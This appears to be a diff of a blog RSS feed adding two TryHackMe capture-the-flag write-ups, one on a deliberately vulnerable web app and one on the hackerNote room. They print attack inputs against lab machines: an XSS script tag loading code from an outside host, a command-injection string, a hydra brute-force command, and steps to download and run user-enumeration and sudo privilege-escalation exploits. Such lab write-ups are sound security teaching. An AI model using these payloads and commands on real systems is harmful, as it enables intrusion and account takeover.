+&lt;p&gt;For the server specifically, we can also force it to produce a 404 error by visiting &lt;code&gt;http://MACHINE_IP/asdf&lt;/code&gt; (or any other nonexisting page) and the server name and version is given on the 404 error page. We could also run &lt;code&gt;nmap -A -T4 MACHINE_IP&lt;/code&gt; to get the server name and version.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What version of Apache is being used?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Check the &lt;code&gt;Server&lt;/code&gt; response header in Burp Suite.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What language was used to create the website?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Check the &lt;code&gt;X-Powered-By&lt;/code&gt; response header.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What version of the language is used?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Check the &lt;code&gt;X-Powered-By&lt;/code&gt; response header.&lt;/p&gt;
+&lt;h2 id=&#34;task-4---authentication&#34;&gt;Task 4 - Authentication&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the admin username?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There&amp;rsquo;s a link to the admin area at the bottom of each page. Click on the link and try to guess the user name.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the admin password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Try to guess the password using common passwords.&lt;/p&gt;
+&lt;p&gt;An alternative to guessing (if this challenge was more difficult) would be to use Burp Suite Intruder to brute force the password using a word list.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the name of the cookie that can be manipulated?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A cookie is set when logging into the admin page. The value is a single digit that can be easily manipulated to steal a session.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the username of a logged on user?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For this we want to brute force the user creation page (&lt;code&gt;http://MACHINE_IP/users/register.php&lt;/code&gt;) since it will tell us when an account already exists.&lt;/p&gt;
+&lt;p&gt;We can use &lt;a href=&#34;https://owasp.org/www-project-zap/&#34;&gt;OWASP ZAP&lt;/a&gt; to fuzz the user names since the Burp Suite Community Edition is slow at brute forcing.&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;re going to use the &lt;a href=&#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt&#34;&gt;SecLists&lt;/a&gt; user name list.&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;re registering an account with each user name that gets submitted, so what we&amp;rsquo;re looking for in the output is the name that can&amp;rsquo;t be registered because it already exists.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the corresponding password to the username?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Try guessing first based on what you know about the user name and user. If you can&amp;rsquo;t guess the password, try brute forcing it with a &lt;a href=&#34;https://github.com/danielmiessler/SecLists/tree/master/Passwords&#34;&gt;word list&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;task-5---cross-site-scripting-xss&#34;&gt;Task 5 - Cross Site Scripting (XSS)&lt;/h2&gt;
+&lt;p&gt;Use the first payload on the linked page to test for XSS.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;SCRIPT SRC=http://xss.rocks/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Test for XSS on the search bar&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This input is vulnerable to reflected XSS.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Test for XSS on the guestbook page&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This input is vulnerable to stored XSS.&lt;/p&gt;
+&lt;h2 id=&#34;task-6---injection&#34;&gt;Task 6 - Injection&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Perform command injection on the check password field&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If we test the field, we get back &lt;code&gt;The command &amp;quot;grep ^test$ /etc/dictionaries-common/words&amp;quot; was used to check if the password was in the dictionary.&lt;/code&gt; which is very handy!&lt;/p&gt;
+&lt;p&gt;We just need to end the grep command and insert our own command after it.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&#39;&#39;;ls;&lt;/code&gt; should work for any command that we have permissions to run. This will hang the application.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Check for SQLi on the application&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The login form (http://MACHINE_IP/users/login.php) is vulnerable to SQLi. Try testing &lt;a href=&#34;https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b&#34;&gt;payloads&lt;/a&gt; to see what is possible.&lt;/p&gt;
+&lt;h2 id=&#34;task-7---miscellaneous--logic-flaws&#34;&gt;Task 7 - Miscellaneous &amp;amp; Logic Flaws&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Find a parameter manipulation vulnerability&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The sample page linked from the home page at &lt;code&gt;http://MACHINE_IP/users/sample.php?userid=1&lt;/code&gt; contains the &lt;code&gt;userid&lt;/code&gt; parameter that we can easily change to view additional photos.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Find a directory traversal vulnerability&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The file name field on the picture upload page (&lt;code&gt;http://MACHINE_IP/pictures/upload.php&lt;/code&gt;) allows us to exploit directory traversal.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Find a forceful browsing vulnerability&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can visit &lt;code&gt;http://MACHINE_IP/upload/&lt;/code&gt; and view all images that have been uploaded by all users.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Logic flaw: try to get an item for free&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can fuzz the coupon code field on the cart review page (&lt;code&gt;http://MACHINE_IP/cart/review.php&lt;/code&gt;). Unsuccessful attempts give us a 303 status code.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -85,6 +879,91 @@ Contents  Task 2 - Walking through the application Task 4 - Authentication Task 
       <guid>https://markramige.com/posts/tryhackme-hackernote-write-up/</guid>
       <description>This TryHackMe challenge gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute-forcing, and privilege escalation. It requires some basic linux skills to get started.
 Contents  Task 1 - Reconnaissance Task 2 - Investigate Task 3 - Exploit Task 4 - Attack Passwords Task 5 - Escalate  Task 1 - Reconnaissance  Which ports are open?</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/hackernote&#34;&gt;This TryHackMe challenge&lt;/a&gt; gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute-forcing, and privilege escalation. It requires some basic linux skills to get started.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#task-1-reconnaissance&#34;&gt;Task 1 - Reconnaissance&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-2-investigate&#34;&gt;Task 2 - Investigate&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-3-exploit&#34;&gt;Task 3 - Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-4-attack-passwords&#34;&gt;Task 4 - Attack Passwords&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-5-escalate&#34;&gt;Task 5 - Escalate&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;task-1---reconnaissance&#34;&gt;Task 1 - Reconnaissance&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Which ports are open? (in numerical order)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can run &lt;code&gt;man nmap&lt;/code&gt; to check for the options we need to scan for ports and service identification (next question).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap -A -T4 MACHINE_IP&lt;/code&gt; seems to be what we&amp;rsquo;re looking for. The output is:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2020-02-28 17:17 EST
+Nmap scan report for MACHINE_IP
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
+|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
+|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
+80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Home - hackerNote
+8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Home - hackerNote
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;What programming language is the backend written in?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Notice the service listed on port 80.&lt;/p&gt;
+&lt;h2 id=&#34;task-2---investigate&#34;&gt;Task 2 - Investigate&lt;/h2&gt;
+&lt;p&gt;Follow the instructions to set up your user account and test the web app. I&amp;rsquo;m proxying the traffic through Burp Suite.&lt;/p&gt;
+&lt;h2 id=&#34;task-3---exploit&#34;&gt;Task 3 - Exploit&lt;/h2&gt;
+&lt;p&gt;Download the &lt;a href=&#34;https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py&#34;&gt;exploit&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/names.txt&#34;&gt;list of user names&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Change the value of the URL variable in the exploit script to &lt;code&gt;&amp;quot;http://MACHINE_IP/api/user/login&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Add your user name to the top of the names.txt file to increase the accuracy of the exploit.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;python3 exploit.py&lt;/code&gt; and answer the two questions based on the output:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;How many usernames from the list are valid?&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What are/is the valid username(s)?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;task-4---attack-passwords&#34;&gt;Task 4 - Attack Passwords&lt;/h2&gt;
+&lt;p&gt;Download the wordlists.zip file. We&amp;rsquo;re running Kali Linux and the hashcat-utils package is installed so we can just run:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/hashcat-utils/combinator.bin colors.txt numbers.txt &amp;gt; wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Next we run hydra to bruteforce our passwords: (replace &lt;code&gt;USERNAME&lt;/code&gt; and &lt;code&gt;MACHINE_IP&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -l USERNAME -P wordlist.txt MACHINE_IP http-post-form &amp;quot;/api/user/login:username=^USER^&amp;amp;password=^PASS^:Invalid Username Or Password&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How many passwords were in your wordlist?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;wc -l wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What was the user&amp;rsquo;s password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Taken from the output of &lt;code&gt;hydra&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the user&amp;rsquo;s SSH password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Log in to the web app and the password is shown&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What&amp;rsquo;s the user flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;ssh USERNAME@MACHINE_IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cat user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;task-5---escalate&#34;&gt;Task 5 - Escalate&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the CVE number for the exploit?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Google &lt;code&gt;pwdfeedback&lt;/code&gt; and we &lt;a href=&#34;https://www.sudo.ws/alerts/pwfeedback.html&#34;&gt;find a page&lt;/a&gt; that explains the vulnerability and gives us the CVE number.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the root flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions on the page to download the exploit, compile it, scp to the server, and run it.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;cat /root/root.txt&lt;/code&gt; to get the flag.&lt;/p&gt;
+</content>
     </item>
     
   </channel>
